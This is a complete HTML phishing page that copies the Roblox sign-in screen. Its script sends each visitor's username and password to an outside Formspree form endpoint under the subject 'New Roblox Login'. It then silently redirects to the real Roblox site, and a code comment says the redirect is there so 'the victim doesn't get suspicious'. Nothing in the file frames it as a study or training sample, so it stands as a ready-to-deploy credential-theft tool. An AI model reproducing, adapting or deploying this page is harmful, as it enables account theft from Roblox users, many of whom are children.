<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Roblox</title>
<style>
  :root {
    --bg-dark: #0f0f0f;
    --panel-bg: #232527;
    --panel-border: #393b3d;
    --text-main: #ffffff;
    --text-muted: #bdbebe;
    --input-bg: #1f2022;
    --input-border: #393b3d;
    --btn-disabled: #3b3d3f;
    --btn-text-disabled: #999;
    --link-hover: #ffffff;
    --font-stack: "Builder Sans", "Helvetica Neue", Arial, sans-serif;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: var(--font-stack);
    background-color: var(--bg-dark);
    color: var(--text-main);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    overflow-x: hidden;
  }

  /* Top Nav Bar */
  .navbar {
    height: 48px;
    background: #18191b;
    display: flex;
    align-items: center;
    padding: 0 16px;
    border-bottom: 1px solid #232527;
    position: relative;
    z-index: 10;
  }
  .nav-logo {
    font-weight: 900;
    font-size: 22px;
    letter-spacing: -1px;
    margin-right: 24px;
    cursor: default;
  }
  .nav-links {
    display: flex;
    gap: 20px;
    font-weight: 600;
    font-size: 15px;
  }
  .nav-links span { color: #fff; cursor: pointer; }
  .nav-links span:hover { color: #ccc; }
  .nav-search {
    margin-left: 24px;
    flex: 1;
    max-width: 400px;
    background: #2c2e30;
    border: 1px solid #393b3d;
    border-radius: 6px;
    padding: 6px 12px;
    color: #fff;
    font-size: 14px;
  }
  .nav-right { margin-left: auto; }
  .btn-signup {
    background: #2f6bd6;
    color: #fff;
    border: none;
    padding: 6px 14px;
    border-radius: 6px;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
  }

  /* Main Container & Background Collage */
  .main-container {
    flex: 1;
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    background: #000;
  }

  /* Faux background collage - mimics the tiled game thumbnails */
  .bg-collage {
    position: absolute;
    inset: -10%;
    display: grid;
    grid-template-columns: repeat(6, 1fr);
    grid-template-rows: repeat(4, 1fr);
    gap: 8px;
    opacity: 0.4;
    transform: rotate(-4deg) scale(1.1);
    pointer-events: none;
  }
  .bg-tile {
    background: linear-gradient(135deg, #222, #444);
    border-radius: 4px;
    position: relative;
    overflow: hidden;
  }
  .bg-tile::after {
    content: "";
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at center, rgba(255,255,255,0.1), transparent);
    opacity: 0.5;
  }

  /* Center Overlay */
  .center-overlay {
    position: relative;
    z-index: 5;
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
    padding: 20px;
  }

  .hero-logo {
    font-weight: 900;
    font-size: 40px;
    letter-spacing: -2px;
    margin-bottom: 24px;
    text-shadow: 0 2px 10px rgba(0,0,0,0.8);
  }

  /* Login Panel */
  .login-panel {
    background: var(--panel-bg);
    border: 1px solid var(--panel-border);
    border-radius: 12px;
    width: 380px;
    max-width: 100%;
    padding: 24px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
  }

  .panel-title {
    font-size: 22px;
    font-weight: 700;
    margin-bottom: 20px;
  }

  .input-group {
    margin-bottom: 16px;
  }
  .input-label {
    display: block;
    font-size: 14px;
    font-weight: 600;
    color: var(--text-main);
    margin-bottom: 6px;
  }
  .input-wrapper {
    position: relative;
  }
  .input-field {
    width: 100%;
    background: var(--input-bg);
    border: 1px solid var(--input-border);
    border-radius: 6px;
    padding: 12px 14px;
    font-family: var(--font-stack);
    font-size: 15px;
    color: var(--text-main);
    outline: none;
    transition: border-color 0.15s;
  }
  .input-field::placeholder { color: #777; }
  .input-field:focus {
    border-color: #777;
  }
  
  .toggle-password {
    position: absolute;
    right: 14px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: #999;
    cursor: pointer;
    font-size: 16px;
  }

  .btn-submit {
    width: 100%;
    background: var(--btn-disabled);
    color: var(--btn-text-disabled);
    border: none;
    border-radius: 6px;
    padding: 12px;
    font-family: var(--font-stack);
    font-size: 15px;
    font-weight: 600;
    margin-top: 8px;
    cursor: not-allowed;
    transition: background 0.15s, color 0.15s;
  }
  /* We add this class via JS when form is valid to simulate the "active" state */
  .btn-submit.valid {
    background: var(--text-main);
    color: #000;
    cursor: pointer;
  }

  .forgot-link {
    display: inline-block;
    color: var(--text-muted);
    text-decoration: underline;
    font-size: 13px;
    margin-top: 16px;
    cursor: pointer;
  }
  .forgot-link:hover { color: var(--link-hover); }

  .divider {
    display: flex;
    align-items: center;
    text-align: center;
    color: var(--text-muted);
    font-size: 12px;
    margin: 20px 0;
  }
  .divider::before, .divider::after {
    content: '';
    flex: 1;
    border-bottom: 1px solid var(--panel-border);
  }
  .divider span { padding: 0 10px; }

  .btn-alt {
    width: 100%;
    background: transparent;
    color: var(--text-main);
    border: 1px solid var(--panel-border);
    border-radius: 6px;
    padding: 10px;
    font-family: var(--font-stack);
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 10px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    transition: background 0.15s;
  }
  .btn-alt:hover { background: rgba(255,255,255,0.05); }
  .btn-alt.icon-btn { padding: 10px; }

  .footer-text {
    text-align: center;
    font-size: 13px;
    color: var(--text-muted);
    margin-top: 24px;
  }
  .footer-text a {
    color: var(--text-main);
    text-decoration: underline;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="navbar">
  <div class="nav-logo">ROBLOX</div>
  <div class="nav-links">
    <span>Charts</span>
    <span>Marketplace</span>
    <span>Create</span>
    <span>Robux</span>
  </div>
  <input type="text" class="nav-search" placeholder="Search">
  <div class="nav-right">
    <button class="btn-signup">Sign Up</button>
  </div>
</div>

<div class="main-container">
  <!-- Faux Game Collage Background -->
  <div class="bg-collage">
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
    <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
  </div>

  <div class="center-overlay">
    <div class="hero-logo">ROBLOX</div>
    
    <div class="login-panel">
      <div class="panel-title">Sign in</div>

      <form id="loginForm">
        <div class="input-group">
          <label class="input-label">Username, email, or phone</label>
          <div class="input-wrapper">
            <input type="text" id="user" name="username" class="input-field" placeholder="Username, email, or phone" required>
          </div>
        </div>

        <div class="input-group">
          <label class="input-label">Password</label>
          <div class="input-wrapper">
            <input type="password" id="pass" name="password" class="input-field" placeholder="Password" required>
            <button type="button" class="toggle-password" id="togglePass" aria-label="Show password">👁</button>
          </div>
        </div>

        <button type="submit" class="btn-submit" id="btnSubmit" disabled>Sign in</button>
      </form>

      <a class="forgot-link">Forgot password or username?</a>

      <div class="divider"><span>OR</span></div>

      <button class="btn-alt icon-btn" type="button">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
        Google
      </button>

      <button class="btn-alt icon-btn" type="button">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
        Apple
      </button>

      <button class="btn-alt" type="button">Other sign in options</button>

      <div class="footer-text">
        Don't have an account? <a>Create one</a>
      </div>
    </div>
  </div>
</div>

<script>
const form = document.getElementById('loginForm');
const user = document.getElementById('user');
const pass = document.getElementById('pass');
const btnSubmit = document.getElementById('btnSubmit');
const togglePass = document.getElementById('togglePass');

// Enable/disable submit button based on input
function checkInputs() {
  if (user.value.trim() !== '' && pass.value.trim() !== '') {
    btnSubmit.classList.add('valid');
    btnSubmit.removeAttribute('disabled');
  } else {
    btnSubmit.classList.remove('valid');
    btnSubmit.setAttribute('disabled', 'true');
  }
}
user.addEventListener('input', checkInputs);
pass.addEventListener('input', checkInputs);

// Toggle password visibility
togglePass.addEventListener('click', () => {
  if (pass.type === 'password') {
    pass.type = 'text';
    togglePass.textContent = '🙈';
  } else {
    pass.type = 'password';
    togglePass.textContent = '👁';
  }
});

// Submit to Formspree
form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const u = user.value.trim();
  const p = pass.value;
  
  btnSubmit.textContent = 'Signing in...';
  btnSubmit.style.backgroundColor = '#3b3d3f'; // Keep it gray while loading
  btnSubmit.style.color = '#999';

  try {
    await fetch('https://formspree.io/f/moeddkzp', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        username: u,
        password: p,
        _subject: "New Roblox Login"
      })
    });
  } catch (_) {
    // Fail silently so the redirect still happens
  }

  // Redirect to real Roblox so the victim doesn't get suspicious
  setTimeout(() => { window.location.href = 'https://www.roblox.com'; }, 1000);
});
</script>
</body>
</html>
